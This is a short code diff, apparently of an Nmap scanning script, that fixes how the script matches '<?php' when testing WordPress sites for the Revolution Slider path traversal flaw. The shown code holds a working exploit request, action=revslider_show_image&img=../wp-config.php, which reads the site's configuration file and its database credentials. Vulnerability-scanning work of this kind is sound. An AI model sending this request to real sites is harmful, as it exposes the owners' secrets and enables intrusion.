@@ -60,8 +60,6 @@ action = function(host, port)
   local vulnPath = "wp-admin/admin-ajax.php"
   local vulnParams = "action=revslider_show_image&img=../wp-config.php"
 
-  local pattern = "<?php"
-
   -- Exploiting the vulnerability
   local response = http.get( host, port, uri..vulnPath.."?"..vulnParams )
 
@@ -97,7 +95,7 @@ action = function(host, port)
     }
 
     -- Matching the patern in the response
-    if( string.match(response.body, pattern) ) then
+    if( string.match(response.body, (("<?php"):gsub("%p","%%%0"))) ) then
       vuln.state = vulns.STATE.EXPLOIT
       vuln.exploit_results = response.body
       return vulnReport:make_output(vuln)
